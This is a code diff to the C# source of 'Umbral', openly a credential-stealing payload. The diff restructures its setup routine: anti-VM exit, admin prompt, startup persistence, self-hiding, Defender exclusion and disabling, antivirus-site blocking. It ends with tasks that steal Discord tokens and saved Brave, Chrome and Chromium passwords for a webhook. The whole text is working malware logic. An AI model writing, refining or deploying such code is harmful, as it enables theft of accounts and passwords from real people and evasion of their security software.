@@ -36,6 +36,7 @@ namespace Umbral.payload
 
         static private async Task Process()
         {
+
             if (string.IsNullOrWhiteSpace(Settings.Webhook)) Environment.Exit(1); // Empty webhook
 
             Syscalls.RegisterMutex();
@@ -43,54 +44,44 @@ namespace Umbral.payload
             while (!await Common.IsConnectionAvailable())
                 Thread.Sleep(60000); // Connection available. Retry every 1 min.
 
-            if (Settings.AntiVm &&
-                Detector.IsVirtualMachine()) Environment.Exit(1); // Exit if virtual machine is detected.
+            if (Settings.AntiVm && Detector.IsVirtualMachine())
+                Environment.Exit(1); // Exit if virtual machine is detected.
 
-            if (!Common.IsInStartup())
+            if (!Common.IsInStartup() && Settings.Startup && Syscalls.CheckAdminPrivileges())
             {
                 Syscalls.AskForAdmin(); // Prompts user to give admin privileges
+                Common.PutInStartup(); // Puts itself in startup
             }
 
-            if (Settings.Melt && !Common.IsInStartup())
+            if (Settings.Melt)
                 Syscalls.HideSelf();
 
             Syscalls.DefenderExclude(Application.ExecutablePath); // Tries to add itself to Defender exclusions
             Syscalls.DisableDefender(); // Tries to disable defender. Fails if tamper protection is enabled.
-
-            if (!Common.IsInStartup() && Settings.Startup && Syscalls.CheckAdminPrivileges())
-                Common.PutInStartup(); // Puts itself in startup
         }
 
         static private async Task Run()
         {
             string archivePath = Path.Combine(Path.GetTempPath(), $"{Common.GenerateRandomString(15)}.ligma");
-
-        retry:
             string tempFolder = Path.Combine(Path.GetTempPath(), Common.GenerateRandomString(15));
-            if (Directory.Exists(tempFolder))
-                try
-                {
-                    Directory.Delete(tempFolder, true);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e);
-                    goto retry;
-                }
 
-            try
+            while (true)
             {
-                Directory.CreateDirectory(tempFolder);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e);
-                Environment.Exit(1);
+                if (Directory.Exists(tempFolder))
+                    try
+                    {
+                        Directory.Delete(tempFolder, true);
+                        Directory.CreateDirectory(tempFolder);
+                        break;
+                    }
+                    catch {
+                        Environment.Exit(1);
+                    }
             }
 
             if (Settings.BlockAvSites && Syscalls.CheckAdminPrivileges()) BlockAvSites();
+            
             var getTokens = Settings.StealDiscordTokens ? TokenStealer.GetAccounts() : Task.Run(() => new DiscordAccountFormat[] { });
-
             var getBravePasswords = Settings.StealPasswords ? Brave.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
             var getChromePasswords = Settings.StealPasswords ? Chrome.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
             var getChromiumPasswords = Settings.StealPasswords ? Chromium.GetPasswords() : Task.Run(() => new PasswordFormat[] { });
